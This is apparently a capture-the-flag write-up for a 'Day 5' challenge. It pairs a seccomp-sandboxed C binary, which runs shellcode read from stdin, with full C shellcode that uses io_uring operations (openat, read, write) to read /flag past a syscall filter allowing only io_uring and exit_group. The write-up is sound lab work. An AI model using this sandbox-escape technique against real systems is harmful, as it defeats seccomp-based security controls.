# Day 5



### Challenge


```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define NORTH_POLE_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main()
{
    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != NORTH_POLE_ADDR) {
        perror("mmap");
        return 1;
    }

    srand(time(NULL));
    int offset = (rand() % 100) + 1;

    puts("🛷 Loading cargo: please stow your sled at the front.");

    if (read(STDIN_FILENO, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("📜 Checking Santa's naughty list... twice!");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("❄️ Dashing through the snow!");
    ((void (*)())(code + offset))();

    // puts("🎅 Merry Christmas to all, and to all a good night!");
    return 0;
}

```


Just a simple seccomp rule that only allows io_uring_setup, io_uring_enter, io_uring_register, and exit_group syscalls


### Solution

Spent majority of my time reading docs and battling the compiler tbh


```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <stdint.h>
#include <stdlib.h>

#ifndef IOSQE_FIXED_FILE
#define IOSQE_FIXED_FILE (1U << 0)
#endif

static long my_syscall(long n,long a1, long a2, long a3,
                              long a4, void * a5, void * a6);
static long my_syscall1(long n,
                              long a1, uintptr_t a2, long a3,
                              long a4, long a5, long a6);


void  _start()
{
    const unsigned ENTRIES = 1;
    const size_t SQE_SZ = ENTRIES * sizeof(struct io_uring_sqe);
    const size_t RING_MEM_SZ = 1024;
    const size_t BUFSZ = 100;

    volatile unsigned char region[8192] __attribute__((aligned(4096)));

  


    struct io_uring_params p = {
        .sq_entries = 0,
        .cq_entries = 0,
        .flags = IORING_SETUP_NO_MMAP,
        .sq_thread_cpu = 0,
        .sq_thread_idle = 0,
        .features = 0,
        .wq_fd = 0
    };

    void *rings_mem = (void *)(region);
    void *sqes_mem  = (void *)(region + 0x1000);

    ((unsigned char*)rings_mem)[0] = 0x41;

    p.cq_off.user_addr = (unsigned long)(uintptr_t)rings_mem;
    p.sq_off.user_addr = (unsigned long)(uintptr_t)sqes_mem;

    int ring_fd = my_syscall1(SYS_io_uring_setup, ENTRIES, (uintptr_t)&p, 0, 0, 0, 0);

    volatile __u32 *sq_head = (volatile __u32 *)((char *)rings_mem + p.sq_off.head);
    volatile __u32 *sq_tail = (volatile __u32 *)((char *)rings_mem + p.sq_off.tail);
    __u32 *sq_array         = (__u32 *)((char *)rings_mem + p.sq_off.array);

    volatile __u32 *cq_head = (volatile __u32 *)((char *)rings_mem + p.cq_off.head);
    volatile __u32 *cq_tail = (volatile __u32 *)((char *)rings_mem + p.cq_off.tail);
    struct io_uring_cqe *cqes = (struct io_uring_cqe *)((char *)rings_mem + p.cq_off.cqes);

    struct io_uring_sqe *sqes = (struct io_uring_sqe *)sqes_mem;

    volatile char filename[16];
__builtin_memcpy((void*)filename, "/flag", 6);
    char *buf [BUFSZ];

    /* ---------------- OPENAT ---------------- */
    __u32 sq_tail_val = *sq_tail;
    __u32 sq_index = sq_tail_val & (p.sq_entries - 1);
    struct io_uring_sqe *open_sqe = &sqes[sq_index];

    *open_sqe = (struct io_uring_sqe){
        .opcode = IORING_OP_OPENAT,
        .fd = AT_FDCWD,
        .addr = (unsigned long)(uintptr_t)filename,
        .len = O_RDONLY,
        .user_data = 0x1111
    };

    sq_array[sq_index] = sq_index;
    __sync_synchronize();
    *sq_tail = sq_tail_val + 1;

    /* *** RAW DIRECT SYSCALL HERE *** */
    my_syscall(SYS_io_uring_enter, ring_fd,
            1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

    __sync_synchronize();
    __u32 cidx = *cq_head & (p.cq_entries - 1);
    struct io_uring_cqe *cqe = &cqes[cidx];
    int file_fd = cqe->res;
    *cq_head = *cq_head + 1;

    /* ---------------- READ ---------------- */
    sq_tail_val = *sq_tail;
    sq_index = sq_tail_val & (p.sq_entries - 1);
    struct io_uring_sqe *read_sqe = &sqes[sq_index];

    *read_sqe = (struct io_uring_sqe){
        .opcode = IORING_OP_READ,
        .fd = file_fd,
        .addr = (unsigned long)(uintptr_t)buf,
        .len = BUFSZ,
        .user_data = 0x2222
    };

    sq_array[sq_index] = sq_index;
    __sync_synchronize();
    *sq_tail = sq_tail_val + 1;

    my_syscall(SYS_io_uring_enter, ring_fd,
            1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

    __sync_synchronize();
    cidx = *cq_head & (p.cq_entries - 1);
    cqe = &cqes[cidx];
    int read_res = cqe->res;
    *cq_head = *cq_head + 1;

    /* ---------------- WRITE ---------------- */
    sq_tail_val = *sq_tail;
    sq_index = sq_tail_val & (p.sq_entries - 1);
    struct io_uring_sqe *write_sqe = &sqes[sq_index];

    *write_sqe = (struct io_uring_sqe){
        .opcode = IORING_OP_WRITE,
        .fd = 1,
        .addr = (unsigned long)(uintptr_t)buf,
        .len = read_res,
        .user_data = 0x3333
    };

    sq_array[sq_index] = sq_index;
    __sync_synchronize();
    *sq_tail = sq_tail_val + 1;

    my_syscall(SYS_io_uring_enter, ring_fd,
            1, 1, IORING_ENTER_GETEVENTS, NULL, 0);

    __sync_synchronize();
    *cq_head = *cq_head + 1;

    my_syscall(SYS_exit_group, 0,
            1, 1, 0, 0, 0);


}


static inline long my_syscall1(long n,
                              long a1, uintptr_t a2, long a3,
                              long a4, long a5, long a6)
{
    long ret;
    __asm__ volatile(
        "mov %1, %%rax\n"
        "mov %2, %%rdi\n"
        "mov %3, %%rsi\n"
        "mov %4, %%rdx\n"
        "mov %5, %%r10\n"
        "mov %6, %%r8\n"
        "mov %7, %%r9\n"
        "syscall\n"
        : "=a"(ret)
        : "g"(n), "g"(a1), "g"(a2), "g"(a3),
          "g"(a4), "g"(a5), "g"(a6)
        : "rcx", "r11", "memory"
    );
    return ret;
}


static inline long my_syscall(long n,
                              long a1, long a2, long a3,
                              long a4, void * a5, void * a6)
{
    long ret;
    __asm__ volatile(
        "mov %1, %%rax\n"
        "mov %2, %%rdi\n"
        "mov %3, %%rsi\n"
        "mov %4, %%rdx\n"
        "mov %5, %%r10\n"
        "mov %6, %%r8\n"
        "mov %7, %%r9\n"
        "syscall\n"
        : "=a"(ret)
        : "g"(n), "g"(a1), "g"(a2), "g"(a3),
          "g"(a4), "g"(a5), "g"(a6)
        : "rcx", "r11", "memory"
    );
    return ret;
}



```

compiled with 

```
gcc -nostdlib test4.c
```

extracted the bytes and sent it into the stdin of the challenge to get the flag
